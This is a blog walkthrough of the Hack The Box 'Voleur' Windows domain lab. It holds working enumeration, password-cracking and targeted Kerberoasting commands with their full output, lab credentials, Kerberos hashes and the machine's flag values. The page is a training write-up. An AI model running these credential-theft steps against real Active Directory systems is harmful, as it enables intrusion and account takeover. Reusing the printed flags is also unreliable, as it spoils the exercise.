<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[HTB] Voleur - Advanced Windows Exploitation | HexHunter404 - Cybersecurity & AI</title><meta name=keywords content="htb,windows,hard,active-directory,privilege-escalation,dpapi,kerberoasting"><meta name=description content="HTB Voleur machine walkthrough - Advanced Windows exploitation with service abuse, DPAPI attacks, and privilege escalation"><meta name=author content="HexHunter404"><link rel=canonical href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/voleur/voleur/><link crossorigin=anonymous href=/dhiaznaidi-blog/assets/css/stylesheet.d9d76451235d3a0244d4ca5f905f7cb3ee224b889a9a513cb5b740e1716b33ff.css integrity="sha256-2ddkUSNdOgJE1MpfkF98s+4iS4iamlE8tbdA4XFrM/8=" rel="preload stylesheet" as=style><link rel=icon href=https://dhiaznaidiblog.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/favicon-32x32.png><link rel=apple-touch-icon href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/apple-touch-icon.png><link rel=mask-icon href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/voleur/voleur/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/voleur/voleur/"><meta property="og:site_name" content="HexHunter404 - Cybersecurity & AI"><meta property="og:title" content="[HTB] Voleur - Advanced Windows Exploitation"><meta property="og:description" content="HTB Voleur machine walkthrough - Advanced Windows exploitation with service abuse, DPAPI attacks, and privilege escalation"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-12-01T10:00:00+01:00"><meta property="article:modified_time" content="2024-12-01T10:00:00+01:00"><meta property="article:tag" content="Htb"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Active-Directory"><meta property="article:tag" content="Privilege-Escalation"><meta property="article:tag" content="Dpapi"><meta property="og:image" content="https://dhiaznaidiblog.github.io/images/writeups/htb/voleur/voleur-banner.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://dhiaznaidiblog.github.io/images/writeups/htb/voleur/voleur-banner.png"><meta name=twitter:title content="[HTB] Voleur - Advanced Windows Exploitation"><meta name=twitter:description content="HTB Voleur machine walkthrough - Advanced Windows exploitation with service abuse, DPAPI attacks, and privilege escalation"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/"},{"@type":"ListItem","position":2,"name":"üéØ Hack The Box - Pro Hacker #544","item":"https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/"},{"@type":"ListItem","position":3,"name":"üñ•Ô∏è HTB Machines - Walkthrough Collection","item":"https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/"},{"@type":"ListItem","position":4,"name":"[HTB] Voleur - Advanced Windows Exploitation","item":"https://dhiaznaidiblog.github.io/dhiaznaidi-blog/writeups/htb/machines/voleur/voleur/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[HTB] Voleur - Advanced Windows Exploitation","name":"[HTB] Voleur - Advanced Windows Exploitation","description":"HTB Voleur machine walkthrough - Advanced Windows exploitation with service abuse, DPAPI attacks, and privilege escalation","keywords":["htb","windows","hard","active-directory","privilege-escalation","dpapi","kerberoasting"],"articleBody":"Machine Information OS:¬†Windows Server 2022 (Domain Controller) Difficulty:¬†Medium Initial Credentials:¬†ryan.naylor:HollowOct31Nyt Domain:¬†voleur.htb Flags Obtained User Flag:¬†9ead16ec422a36bbec3e8eb539ea2d77 Root Flag:¬†092ea0c8c50e977873d72cf015ba61d2 Phase 1: Reconnaissance 1.1 Nmap Scan\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 # Nmap 7.95 scan initiated Sat Jul 5 21:39:01 2025 as: /usr/lib/nmap/nmap -sV -sC -A -Pn -n -T4 -p- -vvv -oA voleur_scan --disable-arp-ping --min-rate=1000 10.129.196.199 Nmap scan report for 10.129.196.199 Host is up, received user-set (0.035s latency). Scanned at 2025-07-05 21:39:02 CEST for 233s Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 03:41:40Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 2222/tcp open ssh syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs= | 256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg= | 256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49670/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 52010/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 52016/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 52036/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.95%E=4%D=7/5%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6869803F%P=x86_64-pc-linux-gnu) SEQ(SP=101%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A) SEQ(SP=106%GCD=1%ISR=104%TI=I%II=I%SS=S%TS=A) OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11) WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC) ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Uptime guess: 0.004 days (since Sat Jul 5 21:36:49 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=262 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-06T03:42:37 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 62173/tcp): CLEAN (Timeout) | Check 2 (port 65250/tcp): CLEAN (Timeout) | Check 3 (port 43717/udp): CLEAN (Timeout) | Check 4 (port 39257/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: 8h00m19s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 25.92 ms 10.10.14.1 2 26.78 ms 10.129.196.199 Read data files from: /usr/share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 5 21:42:55 2025 -- 1 IP address (1 host up) scanned in 234.63 seconds The initial reconnaissance phase began with a comprehensive Nmap scan to identify all open ports and services.\nKey Services Discovered:\n53/tcp (DNS)¬†- Essential for domain name resolution in Active Directory environments 88/tcp (Kerberos)¬†- Core authentication protocol for Windows domains 389/tcp (LDAP)¬†- Directory services for domain queries and authentication 445/tcp (SMB)¬†- File sharing and administrative access 2222/tcp (SSH)¬†- Unusual service for a Windows DC, suggesting WSL or custom implementation 5985/tcp (WinRM)¬†- Windows Remote Management for PowerShell remoting The discovery of SSH on port 2222 was particularly noteworthy, as this is atypical for Windows Domain Controllers and suggested the presence of Windows Subsystem for Linux (WSL) or a custom SSH implementation. This would prove crucial in later phases of the attack.\n1.2 Domain Enumeration\n1 2 3 4 5 # Time synchronization ntpdate voleur.htb # Basic LDAP enumeration ldapsearch -x -H ldap://10.129.196.199 -D \"ryan.naylor@voleur.htb\" -w 'HollowOct31Nyt' -b \"dc=voleur,dc=htb\" \"(objectClass=*)\" -s base Domain enumeration began with time synchronization using¬†ntpdate, which is critical for Kerberos authentication as it requires synchronized clocks between client and server (typically within 5 minutes). The LDAP enumeration provided initial validation of the provided credentials and confirmed the domain structure. This baseline enumeration established the foundation for more detailed reconnaissance using specialized tools.\n1.3 BloodHound \u0026 ldap Collection\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 impacket-GetADUsers -all 'voleur.htb/ryan.naylor:HollowOct31Nyt' -dc-ip $ip -k -no-pass -dc-host dc.voleur.htb 2025-07-06 06:07:16.595561 (+0200) +28808.566181 +/- 0.011743 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28808.566181 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Querying dc.voleur.htb for information about domain. Name Email PasswordLastSet LastLogon -------------------- ------------------------------ ------------------- ------------------- Administrator 2025-01-28 21:35:13.766711 2025-07-06 05:38:12.746180 Guest krbtgt 2025-01-29 09:43:06.152684 ryan.naylor 2025-01-29 10:26:46.368695 2025-07-06 06:04:52.387272 marie.bryant 2025-01-29 10:21:07.540658 lacey.miller 2025-01-29 10:20:10.758901 svc_ldap 2025-01-29 10:20:54.900094 2025-01-31 10:37:45.081360 svc_backup 2025-01-29 10:20:36.962381 2025-07-06 05:38:00.277418 svc_iis 2025-01-29 10:20:45.883878 jeremy.combs 2025-01-29 16:10:32.242480 2025-01-30 12:51:02.392951 svc_winrm 2025-01-31 10:10:12.398769 2025-01-29 16:07:32.711487 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 impacket-GetADComputers 'voleur.htb/ryan.naylor:HollowOct31Nyt' -dc-ip $ip -k -no-pass -dc-host dc.voleur.htb 2025-07-06 06:08:06.505565 (+0200) +28808.098908 +/- 0.010521 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28808.098908 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Querying dc.voleur.htb for information about domain. SAM AcctName DNS Hostname OS Version OS --------------- ----------------------------------- --------------- -------------------- DC$ DC.voleur.htb 10.0 (20348) Windows Server 2022 Standard Kerberos setting\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# ntpdate $ip \u0026\u0026 nxc smb $ip -u ryan.naylor -p 'HollowOct31Nyt' --generate-krb5-file /tmp/krb5.conf 2025-07-06 06:02:52.274677 (+0200) +28828.481068 +/- 0.010524 10.129.196.199 s1 no-leap CLOCK: time stepped by 28828.481068 SMB 10.129.196.199 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.129.196.199 445 DC [-] voleur.htb\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# cat /tmp/krb5.conf [libdefaults] dns_lookup_kdc = false dns_lookup_realm = false default_realm = VOLEUR.HTB [realms] VOLEUR.HTB = { kdc = dc.voleur.htb admin_server = dc.voleur.htb default_domain = voleur.htb } [domain_realm] .voleur.htb = VOLEUR.HTB voleur.htb = VOLEUR.HTB ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# export KRB5_CONFIG=/tmp/krb5.conf ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# kinit ryan.naylor ryan.naylor@VOLEUR.HTB's Password: ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# klist Credentials cache: FILE:/tmp/krb5cc_0 Principal: ryan.naylor@VOLEUR.HTB Issued Expires Principal Jul 6 06:04:52 2025 Jul 6 16:04:52 2025 krbtgt/VOLEUR.HTB@VOLEUR.HTB ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# export KRB5CCNAME=/tmp/krb5cc_0 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# bloodhound-python -u ryan.naylor -d voleur.htb -dc dc.voleur.htb -c All --zip BloodHound collection represents a critical escalation in reconnaissance sophistication. By configuring Kerberos properly and obtaining a Ticket Granting Ticket (TGT) with¬†kinit, we established authenticated access to the domain. The¬†bloodhound-python¬†collector then systematically enumerated domain objects, relationships, and permissions that would be invisible to traditional scanning methods.\nKey Findings:\nDomain:¬†voleur.htb Users:¬†ryan.naylor, marie.bryant, lacey.miller, jeremy.combs, svc_ldap, svc_winrm, svc_backup Group:¬†First-Line Technicians (ryan.naylor is member) The discovery of multiple service accounts (svc_ldap, svc_winrm, svc_backup) immediately suggested potential privilege escalation paths, as service accounts often have elevated permissions and may be vulnerable to Kerberoasting attacks.\nPhase 2: Initial Access 2.1 SMB Share Enumeration (Success with Kerberos)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 nxc smb 10.129.196.199 -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k --shares 2025-07-06 06:25:00.534568 (+0200) -0.001658 +/- 0.013549 voleur.htb 10.129.196.199 s1 no-leap SMB 10.129.196.199 445 DC [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.129.196.199 445 DC [+] voleur.htb\\ryan.naylor:HollowOct31Nyt SMB 10.129.196.199 445 DC [*] Enumerated shares SMB 10.129.196.199 445 DC Share Permissions Remark SMB 10.129.196.199 445 DC ----- ----------- ------ SMB 10.129.196.199 445 DC ADMIN$ Remote Admin SMB 10.129.196.199 445 DC C$ Default share SMB 10.129.196.199 445 DC Finance SMB 10.129.196.199 445 DC HR SMB 10.129.196.199 445 DC IPC$ READ Remote IPC SMB 10.129.196.199 445 DC IT READ SMB 10.129.196.199 445 DC NETLOGON READ Logon server share SMB 10.129.196.199 445 DC SYSVOL READ Logon server share The successful authentication using Kerberos (-k¬†flag) confirmed that the domain controller required Kerberos authentication for SMB access. This is a security best practice that prevents pass-the-hash attacks and ensures all authentication is properly logged and audited.\nAccessible Shares:\nIT (READ)¬†- Departmental share likely containing technical documentation NETLOGON (READ)¬†- Standard domain share for logon scripts SYSVOL (READ)¬†- Standard domain share for policies and scripts The IT share was particularly interesting as it suggested access to technical documentation and potentially sensitive information related to system administration.\n2.2 IT Share Exploration\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb -target-ip 10.129.196.199 2025-07-06 06:53:36.978238 (+0200) +28799.386157 +/- 0.162155 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28799.386157 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands # shares ADMIN$ C$ Finance HR IPC$ IT NETLOGON SYSVOL # use IT # ls drw-rw-rw- 0 Wed Jan 29 10:10:01 2025 . drw-rw-rw- 0 Mon Jun 30 23:08:33 2025 .. drw-rw-rw- 0 Wed Jan 29 10:40:17 2025 First-Line Support # cd First-Line Support # ls drw-rw-rw- 0 Wed Jan 29 10:40:17 2025 . drw-rw-rw- 0 Wed Jan 29 10:10:01 2025 .. -rw-rw-rw- 16896 Fri May 30 00:23:36 2025 Access_Review.xlsx # get Access_Review.xlsx # exit The exploration of the IT share revealed a structured organization with folders corresponding to different support tiers. The ‚ÄúFirst-Line Support‚Äù folder contained an Excel file named ‚ÄúAccess_Review.xlsx‚Äù, which suggested periodic access reviews - a common security practice that often contains sensitive credential information.\n2.4 Excel File Analysis\n1 2 3 4 5 6 7 8 9 10 11 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# office2john Access_Review.xlsx \u003e excel_hash.txt ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# john --wordlist=/home/hexhunter404/Downloads/rockyou.txt excel_hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES]) Cost 1 (MS Office version) is 2013 for all loaded hashes Cost 2 (iteration count) is 100000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status football1 (Access_Review.xlsx) 1g 0:00:00:06 DONE (2025-07-05 23:05) 0.1459g/s 114.4p/s 114.4c/s 114.4C/s football1..lolita Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Password:¬†football1\nThe Excel file was password-protected with a weak password (‚Äúfootball1‚Äù), demonstrating poor security practices. This type of weak password protection is common in corporate environments where users prioritize convenience over security.\nCritical Information Discovered:\nsvc_ldap:¬†M1XyC9pW7qT5Vn (LDAP Services) svc_iis:¬†N5pXvW1VqM7CZ8 (IIS Administration) todd.wolfe:¬†NightT1meP1dg3on14 (Account to be deleted) ryan.naylor:¬†‚ÄúHas Kerberos Pre-Auth disabled temporarily‚Äù The access review spreadsheet contained a treasure trove of sensitive information, including plaintext passwords for multiple service accounts. The note about todd.wolfe‚Äôs account being scheduled for deletion was particularly significant, as deleted accounts often retain valuable data. The notation about ryan.naylor having Kerberos Pre-Authentication disabled temporarily indicated a potential AS-REP roasting vulnerability.\nPhase 3: Privilege Escalation 3.1 Service Account Authentication\n1 2 # Test svc_ldap credentials nxc smb 10.129.196.199 -u svc_ldap -p 'M1XyC9pW7qT5Vn' -d voleur.htb -k The successful authentication with the svc_ldap service account marked a significant escalation in privileges. Service accounts typically have elevated permissions within Active Directory environments, as they need to perform various automated tasks and services.\n3.2 BloodHound Analysis\nKey Discovery:¬†svc_ldap has WriteSPN permission on svc_winrm\nBloodHound analysis revealed that svc_ldap possessed WriteSPN (Write Service Principal Name) permissions on the svc_winrm account. This permission allows modification of Service Principal Names, which can be exploited to perform targeted Kerberoasting attacks. This relationship represents a classic example of how complex Active Directory permissions can create unintended privilege escalation paths.\n3.3 Targeted Kerberoasting (cf. https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Machines/Season8/Voleur/targetedKerberoast] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 ./targetedKerberoast.py -v -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --dc-ip 10.129.196.199 --dc-host dc.voleur.htb -k 2025-07-06 07:46:00.880780 (+0200) +28801.753306 +/- 0.009549 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28801.753306 [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (lacey.miller) [+] Printing hash for (lacey.miller) $krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$9c71ef22710b4dbcd38d56204182f6d2$8631661121f089f3c4c2aea4867a92b124e862894f2c44d9274a20cb2dc216090b9abf4b2610d92db623e8f3594b7ccdfcf66efb2d7fd868451b1b7637167004cbe7fc2da9c1179dd0ca44450df6397164fb3b0ecd4ecc4bf9c1e9113f1b79de3b93a74172ce2e32103175de5830dbc90e2af9e9fa47c624e2bf69a7c61eccad388a8d4c6dfbf37115ca34974e8229fa4d71dcb9ecc0c80db4f9a834ead0907a3542740dec01c45f0da40b246a56813c304dc19e05f32de23e852c7b5fb3668c2c39f921c0a6075a7a4a43295ddbbff4854b1d9135877a718e1d6617b308359fe4ef4280d3580975f2ee4b1f2b1f3049ba73fb8c4e897e700075a8e96dfe603eb9f7dd251f69a9ad7fbe0829ffdbde587ca9cac8c902a895e093e5488796fff1797186d78b5c46ea74882045a881a8d69d2797de0d90b1780b8cb570fe3b7af418dc2fe58cd2f899623f7ee6f4f465578eb87e3b1242550125cda53a5f532f07aba674a83a420c283cdab8ca7a3e82c5d21b4d5ee1599796e88e872913337a4024eee1796f9c3e0c87c779d61eb0f169e8337fec6b38ea491b6d9e51c5f7f7f99f93795aad3e40976972599f29626bf9d3df33a0349d6dc9487bb68ba4b0340900addb6f6eb492b27c2db1285fb045922c2fc9bf2d8226c77034b04ae1951946fae3d5e2844d8f96f7affefa21b28d900f74d8e223c6dcc51cdd9bff150f94e271fa1b0bfb9d845cb37cd71ae8b0e1cc3dcacf0e89809d211146d94873527d6b6b99b5e12bfebc62839387a973800096a8886d5e12352e678655503a0e1e792cfbc5f139120dd59a10d7675d9a48eccdaa76322723cfbe7dcecd8165890ad17bad4219904df285a45dcfed917fedca4031a84580cd8da72056b9d43fb63563ebe4c9e9d79bb234f96b4230648098a6a0159aa8348f14e678a6a4301f93b0c69e77beb9d6c6a01dcdf02b6b75ba55cbb8c4fdc6717c865fcb3cbdd98b938cd52e322f4eb78a549d44f038ff73a09c82a2d680a2a2eb1a07ee2d974484072e61a5bf921356b30d999b5364b6e3881b4d4a6ab7aadaea0be836006c30f2ea77084d8b862d540227f3bc32a6a3da11ddbd2fb4f37105ac5c0ae33293a7706bdb759fdf01ff086e4262f695e86fd3c8597686e2828474400669df3a94e2dc5afa268972bc81ac7d680736d8e60f9e23757a2e12df46f3cd3a689000aca324ad0b97c2cd41a530922ecc4ff68e339ea5fb622694aec219c99ae2f4bc1c3dde7e725f5fb081d8c844fdb8da7bf9219dab333781f61d8dcb805c7483ef3eb30d0fc91c4d5d2962f907377f310d958ada60c8791ec4891eb194576658ccf03b42dc8422f2ac09e34965304fbabf7c6069f236c1ee8c14468d5ee673f6ec0a7272e7f48310e720e95582440b61202367b20c4da0ca32da9f31740f76e0eb4bd0d412738f7f [VERBOSE] SPN removed successfully for (lacey.miller) [VERBOSE] SPN added successfully for (svc_winrm) [+] Printing hash for (svc_winrm) $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$ba33b773e1d5a82f61955402b1b03c4e$76acd3c2fb0001ffdfdbbddb41ce2175310196cf81c359738b595b27e4b6aeb9a713035cc1d3f4c03d73e4fa41c75e9cdfb60bebfd07e586a1e74df4be7cb685cedad8fd28748b35f2730fd4bc65915938dde8ff8779729d7097d4ee5b8683c476b3fc79d8b84255c656a7a9fc3b9d0ee0c7eba6834d29bc4a88c48d7672df9432feae96268981c6258d51d1764861a57b19997b06e8d47b50f113c68c520c037d6559591ab0a63e18694fc22c9e3df3457d7d3e0b2cd8e285110fb48696cee4802dede3a44cd1be77230f94d2522f4d7abe418b5404a44cd27d6c22235cd30971a2fefbc9f7c2c5e1bb31e1ccfd9a70a5d8cf9db1c5e1981e0c788c5242c0e163a31c93b3f658e25c1a63968d0f1b16b0b67aec3a9fe662a8d67117cc95efc7baf68208312b3e7cf58aacae52db3cddc343737d61a2f93d7166aef05149003ed843b447156f605dff71c1d9d38fc52ff062d588914d2edb1e6daf6d60a2d31f1ed32716a2832f56b9c0422fa657cd551152546c5f57ef35a756f9eb9d9fa1cd4d6d893633f87413db436db87730d3cd18659e26511ef9bff55b90a3449ca170d53fac4d4bf7af2aceead7d3b9a57d68bdd0b8ce17883cba72dc2f995d830f58d08499e4ec79f422e0e35e76bdb73e55fdc386d65cd3aa6d0539e4d3c7aa738209aa8b2fb9fba7f15e4b109a390b7d169a47394ad9258122c0ccd60ff30b9d03a7b9125ddf77743ceddfdcdfd98f88a5a31e0e6ce817784294075c368f4410c88e8b9ea8a8293c138187346f938d853feb490291c7923d7fda729e0b2148e201ff4266ef655d262c81abb24dac81154702dbf2a86b91d1bf0917d66824c16775f6e740951cf27e3f3e2a32ae669e84eedd447c4a3c8795ff835ae5d86d61d8bb16480751ffe869e37af4e06aea6f220de0aae54f775da903a6bd70b022a3a6360d8858de45e4110735d823153daf54a6652c71b1f9e0a1185bf4266d2016719d45de57bcd5d56942774848fbe58a4ca3d08c36c6782de9233aee865dc367439ead0d6d7e969b703151ffe8062055d0df4ae38e648d4c750f2e37f98bf86f4e8f33bb214cc7650c6e140fcaa9d6eb28a4015f404ff6186eae9d5bf0750d5576344e037c541eaad33b990f4c2b89f2a144a8b5953eb46d29760f7d3586e8be1b4d40b1ab44cab60675370a3b1d4000f7ba5c702244577abc63955b6279135578a4b8b319d91b8836efcd56c51cee39efaede7f90f63d0f9df8e340047fae229947ec206ecd606bf595544524261a34d50047c4947b293fb2d040f272b5fc0af01bfed543c95a8d68c1e6333ea485b44e474df491a19653ea7